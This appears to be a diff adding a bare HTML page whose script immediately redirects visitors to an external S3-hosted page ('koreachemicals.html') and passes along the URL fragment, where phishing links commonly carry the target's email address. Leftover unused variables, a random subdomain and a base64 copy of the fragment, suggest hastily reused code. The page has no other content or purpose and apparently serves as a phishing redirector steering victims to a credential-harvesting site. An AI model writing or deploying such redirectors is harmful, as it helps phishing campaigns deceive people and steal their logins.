@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript">
+        function getRandomSubdomain(length) {
+            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var result = '';
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Generate a random subdomain string of up to 15 characters
+        var randomSubdomain = getRandomSubdomain(15);
+
+        // Get the query parameter from the hash (if needed)
+        var ai = window.location.hash.substr(1);
+
+        // Encode the query parameter (if needed)
+        var encodedQuery = btoa(ai);
+
+        // Construct the redirect URL
+        var redirectUrl = "https://koreachemical.s3.us-west-1.amazonaws.com/koreachemicals.html" + ai;
+
+        // Redirect immediately
+        setTimeout(function() {
+            window.location.href = redirectUrl;
+        }, 0);  
+    </script>
+</head>
+</html>
